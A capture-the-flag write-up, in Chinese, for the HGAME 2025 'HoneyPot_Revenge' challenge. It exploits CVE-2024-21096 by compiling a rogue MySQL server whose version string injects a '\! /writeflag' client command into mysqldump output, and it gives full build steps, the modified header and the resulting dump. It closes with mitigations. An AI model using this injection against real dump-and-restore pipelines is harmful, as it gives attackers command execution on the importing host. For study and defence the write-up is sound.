# HGAME 2025 Level 21096 HoneyPot_Revenge

## 题目简述

题目后端会连接参赛者提供的 MySQL 服务，执行 `mysqldump`，再把导出内容通过管道交给 `mysql` 客户端导入。攻击目标不是 Web 参数的 Shell 拼接，而是让恶意 MySQL 服务端把换行和 `\! /writeflag` 注入握手中的版本字符串，使它进入 `mysqldump` 生成的 SQL 文本；后续 `mysql` 客户端读取该文本时，会把 `\!` 当作本地系统命令执行。

这一思路来自 CVE-2024-21096。Oracle 将其归入 MySQL Server 的 `Client: mysqldump` 组件；题目把“攻击者可控的恶意数据库服务”作为利用入口。需要特别注意：这里的 `\!` 是 `mysql` 客户端命令，不是由 MySQL 服务端执行的 SQL。

参考资料：

- [Oracle CVE-2024-21096 条目](https://linux.oracle.com/cve/CVE-2024-21096.html)：确认受影响组件是 `Client: mysqldump`；
- [MySQL 客户端命令文档](https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html)：`system`/`\!` 会调用本机默认命令解释器。文档同时指出，新版客户端可通过 `--skip-system-command` 禁用该能力。

## 解题过程

### 1. 理清导出与导入链

正常的逻辑备份流程可以简化为：

```sh
mysqldump -u username -p database_name > dumpfile.sql
mysql -u username -p database_name < dumpfile.sql
```

`mysqldump` 会在输出开头写入注释，其中包含远端服务在握手阶段报告的版本号，例如：

```sql
-- MySQL dump 10.13  Distrib 8.2.0, for Linux (x86_64)
--
-- Host: localhost    Database: test
-- ------------------------------------------------------
-- Server version 8.2.0
```

如果版本字符串始终是可信的单行文本，这只是普通注释。但当远端服务由攻击者控制，而且客户端没有正确转义版本字符串中的换行时，攻击者就能结束注释行并插入新的客户端命令。

题目后端又把导出结果直接送给 `mysql`：

```sh
mysqldump <remote-options> | mysql <local-options>
```

于是数据流变为：

```text
恶意服务端握手版本
        ↓
mysqldump 输出的“SQL”文本
        ↓
mysql 客户端逐行解释
        ↓
\! /writeflag 在题目容器内执行
```

### 2. 为什么 `\!` 能变成 RCE

`mysql` 除了发送 SQL 语句，还会在客户端本地处理一组反斜杠命令。`\! command` 是 `system command` 的短形式，其处理逻辑最终调用系统命令执行函数。概念上相当于：

```cpp
static int com_shell(String *, char *line) {
    // 跳过命令名前的空格并取得后续 Shell 命令
    while (my_isspace(charset_info, *line))
        line++;

    char *shell_cmd = strchr(line, ' ');
    if (!shell_cmd)
        return -1;

    if (!opt_system_command)
        return -1;

    return system(shell_cmd) == -1 ? -1 : 0;
}
```

因此，只要导入流中出现一个从行首开始的：

```text
\! /writeflag
```

且题目所用 `mysql` 客户端允许 system 命令，`/writeflag` 就会在运行导入客户端的主机上执行。反弹 Shell 会长期占用这条导入链，官方 WP 因而建议调用题目专门提供、能够快速退出的 `/writeflag`。

### 3. 构造恶意版本字符串

官方解法选择直接编译 MySQL 8.0.34 服务端，在 `mysql_version.h.in` 中把服务端版本改成带换行的字符串：

```c
#ifndef _mysql_version_h
#define _mysql_version_h

#define PROTOCOL_VERSION             @PROTOCOL_VERSION@
#define MYSQL_SERVER_VERSION         "8.0.0-injection-test\n\\! /writeflag"
#define MYSQL_BASE_VERSION           "mysqld-8.0.34"
#define MYSQL_SERVER_SUFFIX_DEF      "@MYSQL_SERVER_SUFFIX@"
#define MYSQL_VERSION_ID             @MYSQL_VERSION_ID@
#define MYSQL_PORT                   @MYSQL_TCP_PORT@
#define MYSQL_ADMIN_PORT             @MYSQL_ADMIN_TCP_PORT@
#define MYSQL_PORT_DEFAULT           @MYSQL_TCP_PORT_DEFAULT@
#define MYSQL_UNIX_ADDR              "@MYSQL_UNIX_ADDR@"
#define MYSQL_CONFIG_NAME            "my"
#define MYSQL_PERSIST_CONFIG_NAME    "mysqld-auto"
#define MYSQL_COMPILATION_COMMENT    "@COMPILATION_COMMENT@"
#define MYSQL_COMPILATION_COMMENT_SERVER \
    "@COMPILATION_COMMENT_SERVER@"
#define LIBMYSQL_VERSION             "8.0.34-custom"
#define LIBMYSQL_VERSION_ID          @MYSQL_VERSION_ID@

#ifndef LICENSE
#define LICENSE GPL
#endif

#endif
```

关键只有两种转义：

- `\n` 在握手版本中产生真实换行，使后续内容脱离 `-- Server version ...` 注释；
- `\\!` 在 C 字符串中产生字面量 `\!`，供 `mysql` 客户端识别。

最终 `mysqldump` 输出中相应位置会变成：

```sql
-- Server version 8.0.0-injection-test
\! /writeflag
```

### 4. 编译并启动恶意 MySQL 服务

官方 WP 使用 Ubuntu 24.04 和 MySQL 8.0.34 源码，准备步骤如下：

```sh
sudo apt-get update
sudo apt-get install -y \
  build-essential cmake bison libncurses5-dev \
  libtirpc-dev libssl-dev pkg-config

wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
tar -zxvf mysql-boost-8.0.34.tar.gz
cd mysql-8.0.34
```

修改版本模板后编译并安装：

```sh
mkdir build
cd build
cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost
make -j"$(nproc)"
sudo make install
```

初始化运行账户和数据目录：

```sh
sudo groupadd mysql
sudo useradd -r -g mysql -s /bin/false mysql

sudo /usr/local/mysql/bin/mysqld \
  --initialize \
  --user=mysql \
  --basedir=/usr/local/mysql \
  --datadir=/usr/local/mysql/data

sudo chown -R mysql:mysql /usr/local/mysql
sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &
```

初始化命令会输出临时 root 密码，需要先记录。登录后重置密码并创建一个可供 `mysqldump` 访问的数据库：

```sh
/usr/local/mysql/bin/mysql -u root -p
```

```sql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;
CREATE DATABASE test;
EXIT;
```

若题目容器从公网连接，还需监听合适的网络接口并创建只具备题目所需最小权限的远程账号；不能只保留 `root@localhost`。部署到公开地址时也不应暴露真实业务数据库或复用其他密码。

可先检查编译结果中的版本字符串：

```sh
/usr/local/mysql/bin/mysql --version
```

预期能看到版本文本在换行后出现：

```text
8.0.0-injection-test
\! /writeflag
```

### 5. 让题目导入恶意数据库

在题目导入页面或 API 中填写恶意服务的主机、端口、账号、密码和 `test` 数据库，触发一次导入。后端 `mysqldump` 连接恶意服务后，会把被污染的版本行写入管道；本地 `mysql` 随即解释 `\! /writeflag`。

写入完成后访问题目 `/flag` 路径即可取得 flag。原 PDF 没有保留具体 flag 字符串，因此不补造。

## 方法总结

本题完整利用链是“服务端握手字段注入 → `mysqldump` 生成恶意文本 → `mysql` 把文本中的 `\!` 当作本地命令 → `/writeflag`”。它说明备份文件并不天然只是数据：只要恢复工具支持本地元命令，导入不可信 dump 就可能跨越 SQL 与操作系统命令边界。

防御时应同时处理链条两端：升级已修复的客户端、不要从不可信数据库服务直接生成并自动恢复 dump，并在支持的 `mysql` 版本中使用 `--skip-system-command` 或 `--binary-mode` 禁止本地命令解析。若业务必须搬运第三方 dump，还应在隔离账户和隔离容器中完成检查与导入。
